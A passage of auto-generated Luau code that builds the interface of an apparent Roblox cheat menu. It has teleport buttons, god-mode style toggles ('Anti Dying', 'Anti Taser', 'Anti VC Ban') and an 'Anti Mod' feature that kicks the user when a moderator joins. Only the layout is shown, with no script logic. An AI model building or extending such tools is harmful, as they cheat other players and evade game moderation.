UI["183"]["BackgroundTransparency"] = 1
UI["183"]["Name"] = [[Prison]]
UI["183"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["183"]["Text"] = [[Prison]]
UI["183"]["Position"] = UDim2.new(-0.00691, 0, 0.69896, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Prison.UIGradient \\ --
UI["184"] = Instance.new("UIGradient", UI["183"])
UI["184"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Fire Station \\ --
UI["185"] = Instance.new("TextButton", UI["174"])
UI["185"]["BorderSizePixel"] = 0
UI["185"]["TextSize"] = 37
UI["185"]["TextColor3"] = Color3.fromRGB(195, 195, 195)
UI["185"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["185"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["185"]["Size"] = UDim2.new(0, 187, 0, 54)
UI["185"]["BackgroundTransparency"] = 1
UI["185"]["Name"] = [[Fire Station]]
UI["185"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["185"]["Text"] = [[Fire depar.]]
UI["185"]["Position"] = UDim2.new(-0.00691, 0, 0.7911, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.Fire Station.UIGradient \\ --
UI["186"] = Instance.new("UIGradient", UI["185"])
UI["186"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.UIListLayout \\ --
UI["187"] = Instance.new("UIListLayout", UI["174"])
UI["187"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center
UI["187"]["Padding"] = UDim.new(0, 2)
UI["187"]["SortOrder"] = Enum.SortOrder.LayoutOrder

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.ScrollingFrame.UIPadding \\ --
UI["188"] = Instance.new("UIPadding", UI["174"])
UI["188"]["PaddingTop"] = UDim.new(0, 7)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.TEXT \\ --
UI["189"] = Instance.new("TextLabel", UI["151"])
UI["189"]["BorderSizePixel"] = 0
UI["189"]["TextTransparency"] = 0.44
UI["189"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["189"]["TextSize"] = 28
UI["189"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["189"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["189"]["BackgroundTransparency"] = 1
UI["189"]["Size"] = UDim2.new(0, 423, 0, 28)
UI["189"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["189"]["Text"] = [[Teleport Tab]]
UI["189"]["Name"] = [[TEXT]]
UI["189"]["Position"] = UDim2.new(0, 0, 0.03524, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.TEXT.UICorner \\ --
UI["18a"] = Instance.new("UICorner", UI["189"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.TEXT.Underline \\ --
UI["18b"] = Instance.new("Frame", UI["189"])
UI["18b"]["BorderSizePixel"] = 0
UI["18b"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["18b"]["Size"] = UDim2.new(0, 222, 0, -2)
UI["18b"]["Position"] = UDim2.new(0.23743, 0, 1.32143, 0)
UI["18b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["18b"]["Name"] = [[Underline]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.Underline \\ --
UI["18c"] = Instance.new("Frame", UI["151"])
UI["18c"]["Visible"] = false
UI["18c"]["BorderSizePixel"] = 0
UI["18c"]["BackgroundColor3"] = Color3.fromRGB(45, 45, 45)
UI["18c"]["Size"] = UDim2.new(0, 8, 0, -207)
UI["18c"]["Position"] = UDim2.new(0.41785, 0, 1, 0)
UI["18c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["18c"]["Name"] = [[Underline]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.UICorner \\ --
UI["18d"] = Instance.new("UICorner", UI["151"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.LocalScript \\ --
UI["18e"] = Instance.new("LocalScript", UI["151"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN \\ --
UI["18f"] = Instance.new("Frame", UI["e"])
UI["18f"]["Visible"] = false
UI["18f"]["BorderSizePixel"] = 0
UI["18f"]["BackgroundColor3"] = Color3.fromRGB(27, 27, 27)
UI["18f"]["Size"] = UDim2.new(0, 444, 0, 262)
UI["18f"]["Position"] = UDim2.new(0.2262, 0, 0.15519, 0)
UI["18f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["18f"]["Name"] = [[MAIN]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.UICorner \\ --
UI["190"] = Instance.new("UICorner", UI["18f"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.Underline \\ --
UI["191"] = Instance.new("Frame", UI["18f"])
UI["191"]["BorderSizePixel"] = 0
UI["191"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["191"]["Size"] = UDim2.new(0, 2, 0, -193)
UI["191"]["Position"] = UDim2.new(0.47297, 0, 0.94113, 0)
UI["191"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["191"]["Name"] = [[Underline]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.TEXT \\ --
UI["192"] = Instance.new("TextLabel", UI["18f"])
UI["192"]["BorderSizePixel"] = 0
UI["192"]["TextTransparency"] = 0.44
UI["192"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["192"]["TextSize"] = 28
UI["192"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["192"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["192"]["BackgroundTransparency"] = 1
UI["192"]["Size"] = UDim2.new(0, 423, 0, 28)
UI["192"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["192"]["Text"] = [[Main Tab]]
UI["192"]["Name"] = [[TEXT]]
UI["192"]["Position"] = UDim2.new(0, 0, 0.03524, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.TEXT.UICorner \\ --
UI["193"] = Instance.new("UICorner", UI["192"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.TEXT.Underline \\ --
UI["194"] = Instance.new("Frame", UI["192"])
UI["194"]["BorderSizePixel"] = 0
UI["194"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["194"]["Size"] = UDim2.new(0, 199, 0, -2)
UI["194"]["Position"] = UDim2.new(0.26478, 0, 1.21429, 0)
UI["194"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["194"]["Name"] = [[Underline]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.text \\ --
UI["195"] = Instance.new("TextLabel", UI["18f"])
UI["195"]["TextWrapped"] = true
UI["195"]["BorderSizePixel"] = 0
UI["195"]["TextTransparency"] = 0.8
UI["195"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["195"]["TextSize"] = 19
UI["195"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["195"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["195"]["BackgroundTransparency"] = 1
UI["195"]["Size"] = UDim2.new(0, 182, 0, 77)
UI["195"]["Visible"] = false
UI["195"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["195"]["Text"] = [[Anti Mod is automatically activated, if a moderator joins you will be automatically kicked!]]
UI["195"]["Name"] = [[text]]
UI["195"]["Position"] = UDim2.new(0.03604, 0, 0.58866, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.UIGradient \\ --
UI["196"] = Instance.new("UIGradient", UI["18f"])
UI["196"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(78, 78, 78))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1 \\ --
UI["197"] = Instance.new("ScrollingFrame", UI["18f"])
UI["197"]["Active"] = true
UI["197"]["SizeConstraint"] = Enum.SizeConstraint.RelativeXX
UI["197"]["BorderSizePixel"] = 0
UI["197"]["CanvasSize"] = UDim2.new(0, 0, 1, 0)
UI["197"]["AutoLocalize"] = false
UI["197"]["MidImage"] = [[rbxassetid://88305916544750]]
UI["197"]["VerticalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar
UI["197"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["197"]["Name"] = [[ScrollingFrame1]]
UI["197"]["HorizontalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar
UI["197"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY
UI["197"]["Size"] = UDim2.new(0, 245, 0, 193)
UI["197"]["ScrollBarImageColor3"] = Color3.fromRGB(65, 215, 255)
UI["197"]["Position"] = UDim2.new(0.44369, 0, 0.20449, 0)
UI["197"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["197"]["ScrollBarThickness"] = 5
UI["197"]["BackgroundTransparency"] = 1

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.1SelfRevive \\ --
UI["198"] = Instance.new("TextButton", UI["197"])
UI["198"]["BorderSizePixel"] = 0
UI["198"]["TextSize"] = 27
UI["198"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["198"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["198"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["198"]["Size"] = UDim2.new(0, 197, 0, 56)
UI["198"]["BackgroundTransparency"] = 0.85
UI["198"]["Name"] = [[1SelfRevive]]
UI["198"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["198"]["Text"] = [[Self Revive]]
UI["198"]["Position"] = UDim2.new(0.11837, 0, 0.78313, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.1SelfRevive.UICorner \\ --
UI["199"] = Instance.new("UICorner", UI["198"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.1SelfRevive.UIGradient \\ --
UI["19a"] = Instance.new("UIGradient", UI["198"])
UI["19a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.1SelfRevive.TextLabel 1 \\ --
UI["19b"] = Instance.new("TextLabel", UI["198"])
UI["19b"]["TextWrapped"] = true
UI["19b"]["BorderSizePixel"] = 0
UI["19b"]["TextTransparency"] = 0.32
UI["19b"]["TextScaled"] = true
UI["19b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["19b"]["TextSize"] = 74
UI["19b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["19b"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["19b"]["BackgroundTransparency"] = 1
UI["19b"]["Size"] = UDim2.new(0, 201, 0, 16)
UI["19b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["19b"]["Text"] = [[You heal yourself automatically]]
UI["19b"]["Name"] = [[TextLabel 1]]
UI["19b"]["Position"] = UDim2.new(0, 0, 1.05766, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.1SelfRevive.LocalScript \\ --
UI["19c"] = Instance.new("LocalScript", UI["198"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.1SelfRevive.animation \\ --
UI["19d"] = Instance.new("LocalScript", UI["198"])
UI["19d"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.1SelfRevive.UIStroke \\ --
UI["19e"] = Instance.new("UIStroke", UI["198"])
UI["19e"]["Transparency"] = 0.63
UI["19e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["19e"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.1SelfRevive.Click Sound \\ --
UI["19f"] = Instance.new("LocalScript", UI["198"])
UI["19f"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.2AntiDying \\ --
UI["1a0"] = Instance.new("TextButton", UI["197"])
UI["1a0"]["BorderSizePixel"] = 0
UI["1a0"]["TextSize"] = 24
UI["1a0"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["1a0"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["1a0"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["1a0"]["Size"] = UDim2.new(0, 197, 0, 56)
UI["1a0"]["BackgroundTransparency"] = 0.85
UI["1a0"]["Name"] = [[2AntiDying]]
UI["1a0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1a0"]["Text"] = [[Anti Dying: Off]]
UI["1a0"]["Position"] = UDim2.new(0.11491, 0, 0.87472, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.2AntiDying.UICorner \\ --
UI["1a1"] = Instance.new("UICorner", UI["1a0"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.2AntiDying.UIGradient \\ --
UI["1a2"] = Instance.new("UIGradient", UI["1a0"])
UI["1a2"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.2AntiDying.TextLabel 1 \\ --
UI["1a3"] = Instance.new("TextLabel", UI["1a0"])
UI["1a3"]["TextWrapped"] = true
UI["1a3"]["BorderSizePixel"] = 0
UI["1a3"]["TextTransparency"] = 0.32
UI["1a3"]["TextScaled"] = true
UI["1a3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["1a3"]["TextSize"] = 74
UI["1a3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["1a3"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["1a3"]["BackgroundTransparency"] = 1
UI["1a3"]["Size"] = UDim2.new(0, 233, 0, 16)
UI["1a3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1a3"]["Text"] = [[with little hp you will be saved]]
UI["1a3"]["Name"] = [[TextLabel 1]]
UI["1a3"]["Position"] = UDim2.new(-0.06984, 0, 1.11401, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.2AntiDying.LocalScript \\ --
UI["1a4"] = Instance.new("LocalScript", UI["1a0"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.2AntiDying.animation \\ --
UI["1a5"] = Instance.new("LocalScript", UI["1a0"])
UI["1a5"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.2AntiDying.UIStroke \\ --
UI["1a6"] = Instance.new("UIStroke", UI["1a0"])
UI["1a6"]["Transparency"] = 0.63
UI["1a6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["1a6"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.2AntiDying.Click Sound \\ --
UI["1a7"] = Instance.new("LocalScript", UI["1a0"])
UI["1a7"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.3AntiFall \\ --
UI["1a8"] = Instance.new("TextButton", UI["197"])
UI["1a8"]["BorderSizePixel"] = 0
UI["1a8"]["TextSize"] = 24
UI["1a8"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["1a8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["1a8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["1a8"]["Size"] = UDim2.new(0, 197, 0, 56)
UI["1a8"]["BackgroundTransparency"] = 0.85
UI["1a8"]["Name"] = [[3AntiFall]]
UI["1a8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1a8"]["Text"] = [[Anti Fall Damage: Off]]
UI["1a8"]["Position"] = UDim2.new(0.11491, 0, 0.43318, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.3AntiFall.UICorner \\ --
UI["1a9"] = Instance.new("UICorner", UI["1a8"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.3AntiFall.UIGradient \\ --
UI["1aa"] = Instance.new("UIGradient", UI["1a8"])
UI["1aa"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.3AntiFall.TextLabel 1 \\ --
UI["1ab"] = Instance.new("TextLabel", UI["1a8"])
UI["1ab"]["TextWrapped"] = true
UI["1ab"]["BorderSizePixel"] = 0
UI["1ab"]["TextTransparency"] = 0.32
UI["1ab"]["TextScaled"] = true
UI["1ab"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["1ab"]["TextSize"] = 74
UI["1ab"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["1ab"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["1ab"]["BackgroundTransparency"] = 1
UI["1ab"]["Size"] = UDim2.new(0, 233, 0, 16)
UI["1ab"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1ab"]["Text"] = [[Anti Fall Damage]]
UI["1ab"]["Name"] = [[TextLabel 1]]
UI["1ab"]["Position"] = UDim2.new(-0.06984, 0, 1.11401, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.3AntiFall.LocalScript \\ --
UI["1ac"] = Instance.new("LocalScript", UI["1a8"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.3AntiFall.animation \\ --
UI["1ad"] = Instance.new("LocalScript", UI["1a8"])
UI["1ad"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.3AntiFall.UIStroke \\ --
UI["1ae"] = Instance.new("UIStroke", UI["1a8"])
UI["1ae"]["Transparency"] = 0.63
UI["1ae"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["1ae"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.3AntiFall.Click Sound \\ --
UI["1af"] = Instance.new("LocalScript", UI["1a8"])
UI["1af"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.UIListLayout \\ --
UI["1b0"] = Instance.new("UIListLayout", UI["197"])
UI["1b0"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center
UI["1b0"]["Padding"] = UDim.new(0, 40)
UI["1b0"]["SortOrder"] = Enum.SortOrder.LayoutOrder

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.UIPadding \\ --
UI["1b1"] = Instance.new("UIPadding", UI["197"])
UI["1b1"]["PaddingTop"] = UDim.new(0, 7)
UI["1b1"]["PaddingBottom"] = UDim.new(0, 20)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.4AntiDowned \\ --
UI["1b2"] = Instance.new("TextButton", UI["197"])
UI["1b2"]["BorderSizePixel"] = 0
UI["1b2"]["TextSize"] = 24
UI["1b2"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["1b2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["1b2"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["1b2"]["Size"] = UDim2.new(0, 197, 0, 56)
UI["1b2"]["BackgroundTransparency"] = 0.85
UI["1b2"]["Name"] = [[4AntiDowned]]
UI["1b2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1b2"]["Text"] = [[Anti Downed: Off]]
UI["1b2"]["Position"] = UDim2.new(0.11837, 0, 0.78313, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.4AntiDowned.UICorner \\ --
UI["1b3"] = Instance.new("UICorner", UI["1b2"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.4AntiDowned.UIGradient \\ --
UI["1b4"] = Instance.new("UIGradient", UI["1b2"])
UI["1b4"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.4AntiDowned.TextLabel 1 \\ --
UI["1b5"] = Instance.new("TextLabel", UI["1b2"])
UI["1b5"]["TextWrapped"] = true
UI["1b5"]["BorderSizePixel"] = 0
UI["1b5"]["TextTransparency"] = 0.32
UI["1b5"]["TextScaled"] = true
UI["1b5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["1b5"]["TextSize"] = 74
UI["1b5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["1b5"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["1b5"]["BackgroundTransparency"] = 1
UI["1b5"]["Size"] = UDim2.new(0, 231, 0, 16)
UI["1b5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1b5"]["Text"] = [[Anti Damage]]
UI["1b5"]["Name"] = [[TextLabel 1]]
UI["1b5"]["Position"] = UDim2.new(-0.06594, 0, 1.11401, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.4AntiDowned.LocalScript \\ --
UI["1b6"] = Instance.new("LocalScript", UI["1b2"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.4AntiDowned.animation \\ --
UI["1b7"] = Instance.new("LocalScript", UI["1b2"])
UI["1b7"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.4AntiDowned.UIStroke \\ --
UI["1b8"] = Instance.new("UIStroke", UI["1b2"])
UI["1b8"]["Transparency"] = 0.63
UI["1b8"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["1b8"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.4AntiDowned.Click Sound \\ --
UI["1b9"] = Instance.new("LocalScript", UI["1b2"])
UI["1b9"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2 \\ --
UI["1ba"] = Instance.new("ScrollingFrame", UI["18f"])
UI["1ba"]["Active"] = true
UI["1ba"]["ScrollingDirection"] = Enum.ScrollingDirection.Y
UI["1ba"]["SizeConstraint"] = Enum.SizeConstraint.RelativeXX
UI["1ba"]["BorderSizePixel"] = 0
UI["1ba"]["CanvasSize"] = UDim2.new(0, 0, 1, 0)
UI["1ba"]["AutoLocalize"] = false
UI["1ba"]["MidImage"] = [[rbxassetid://88305916544750]]
UI["1ba"]["VerticalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar
UI["1ba"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["1ba"]["Name"] = [[ScrollingFrame2]]
UI["1ba"]["HorizontalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar
UI["1ba"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY
UI["1ba"]["Size"] = UDim2.new(0, 208, 0, 191)
UI["1ba"]["ScrollBarImageColor3"] = Color3.fromRGB(65, 215, 255)
UI["1ba"]["Position"] = UDim2.new(-0.00125, 0, 0.21136, 0)
UI["1ba"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1ba"]["ScrollBarThickness"] = 5
UI["1ba"]["BackgroundTransparency"] = 1

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.UIPadding \\ --
UI["1bb"] = Instance.new("UIPadding", UI["1ba"])
UI["1bb"]["PaddingTop"] = UDim.new(0, 7)
UI["1bb"]["PaddingBottom"] = UDim.new(0, 20)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiTaser \\ --
UI["1bc"] = Instance.new("TextButton", UI["1ba"])
UI["1bc"]["BorderSizePixel"] = 0
UI["1bc"]["TextSize"] = 24
UI["1bc"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["1bc"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["1bc"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["1bc"]["Size"] = UDim2.new(0, 181, 0, 56)
UI["1bc"]["BackgroundTransparency"] = 0.85
UI["1bc"]["Name"] = [[AntiTaser]]
UI["1bc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1bc"]["Text"] = [[Set Anti Taser]]
UI["1bc"]["Position"] = UDim2.new(0.03604, 0, 0.24515, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiTaser.UICorner \\ --
UI["1bd"] = Instance.new("UICorner", UI["1bc"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiTaser.TextLabel 1 \\ --
UI["1be"] = Instance.new("TextLabel", UI["1bc"])
UI["1be"]["TextWrapped"] = true
UI["1be"]["BorderSizePixel"] = 0
UI["1be"]["TextTransparency"] = 0.32
UI["1be"]["TextScaled"] = true
UI["1be"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["1be"]["TextSize"] = 74
UI["1be"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["1be"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["1be"]["BackgroundTransparency"] = 1
UI["1be"]["Size"] = UDim2.new(0, 211, 0, 16)
UI["1be"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1be"]["Text"] = [[you can't be tasered]]
UI["1be"]["Name"] = [[TextLabel 1]]
UI["1be"]["Position"] = UDim2.new(-0.0884, 0, 1.11401, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiTaser.LocalScript \\ --
UI["1bf"] = Instance.new("LocalScript", UI["1bc"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiTaser.UIGradient \\ --
UI["1c0"] = Instance.new("UIGradient", UI["1bc"])
UI["1c0"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiTaser.animation \\ --
UI["1c1"] = Instance.new("LocalScript", UI["1bc"])
UI["1c1"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiTaser.UIStroke \\ --
UI["1c2"] = Instance.new("UIStroke", UI["1bc"])
UI["1c2"]["Transparency"] = 0.63
UI["1c2"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["1c2"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiTaser.Click Sound \\ --
UI["1c3"] = Instance.new("LocalScript", UI["1bc"])
UI["1c3"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiVCBan \\ --
UI["1c4"] = Instance.new("TextButton", UI["1ba"])
UI["1c4"]["BorderSizePixel"] = 0
UI["1c4"]["TextSize"] = 24
UI["1c4"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
